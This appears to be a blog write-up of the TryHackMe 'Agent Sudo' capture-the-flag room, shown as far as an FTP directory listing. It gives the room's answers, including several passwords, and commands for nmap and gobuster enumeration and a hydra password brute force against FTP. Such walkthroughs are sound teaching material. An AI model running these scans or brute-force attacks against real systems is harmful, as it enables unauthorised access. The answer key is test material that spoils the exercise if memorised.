---
layout: post
title: Agent Sudo
categories: [CyberSecurity, CTF]
tags: [thm, easy, nmap, gobuster, hydra, exiftool, xxd, binwalk, zip2john, JohnTheRipper, 7z, Cyberchef, steghide]
---
## Task 1: Author Note
Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.

## Task 2: Enumerate
Enumerate the machine and get all the important information

### Questions

Q1 How many opens Ports?
```
3
```
Q2 How you redirect yourself to a secret page?
```
user-agent
```
Q3 What is the agent name?
```
chris
```
### MyWalk

Beginning with an **nmap** scan, and save the results on nmap/initial for future reference:

```bash
nmap -T4 -sC -sV -Pn -oN nmap/initial 10.10.188.70
```

Now I try to get the Q2 answer, using **gobuster**:


```bash
gobuster dir --url http://10.10.26.150 -w //usr/share/wordlists/dirb/common.txt | tee gobuster.txt
```

No secret page revealed...  
Hint: Answer format: xxxx-xxxxx  
visiting the page we got:

```
Dear agents,
Use your own codename as user-agent to access the site.

From,
Agent R

```
it seems Q2 is "user-agent"

The hint for Q3:  
"You might face problem on using Firefox. Try 'user agent switcher' plugin with  user agent: C"  
So, let's install user agent switcher plugin, and set the user agent as "C".  After reloading the page I got:
```
Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!


From,

Agent R
```
Now we know the Q3

## Task 3: Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

### Questions
Q1. Hint: "Hail hydra!"  
Q1. FTP password

```
crystal
```

Q2. Zip file password

```
alien
```

Q3. steg password

```
Area51
```

Q4 Who is the other agent (in full name)?

```
james
```

Q5 SSH password

```
hackerrules!
```

### MyWalk

For Q3 lets try **hydra** as sugested by the hint:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.149.150 -t 4
...
[21][ftp] host: 10.10.149.150 login: chris password: crystal
1 of 1 target successfully completed, 1 valid password found
```
Q1 done

Now lets connect to the ftp server with chris:crystal

```bash
└─$ ftp chris@10.10.149.150
Connected to 10.10.149.150.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||36713|)
150 Here comes the directory listing.
-rw-r--r-- 1 0 0 217 Oct 29 2019 To_agentJ.txt
-rw-r--r-- 1 0 0 33143 Oct 29 2019 cute-alien.jpg
-rw-r--r-- 1 0 0 34842 Oct 29 2019 cutie.png
226 Directory send OK.
ftp>
```